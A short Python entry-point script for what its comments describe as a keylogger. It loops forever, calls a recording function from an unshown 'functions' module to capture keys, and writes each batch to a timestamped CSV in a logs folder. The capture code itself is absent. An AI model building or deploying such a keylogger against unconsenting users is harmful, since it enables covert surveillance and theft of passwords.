import functions

def main():

    tempLogName = functions.calcualteDataAndHour()      #from date and hour create the new file name where storage the output
    
    logsPath = "logs/"  #logs path where output is stored

    functions.checkLogsPath(logsPath)   #check if the output storage is existing

    while True:
        tempLog = functions.recording()     #recording keys... and save it in a variable

        functions.writeToFile(logsPath,tempLogName+".csv",tempLog) #write into a new file the output 

#########################
if __name__== "__main__":
   main()                
#########################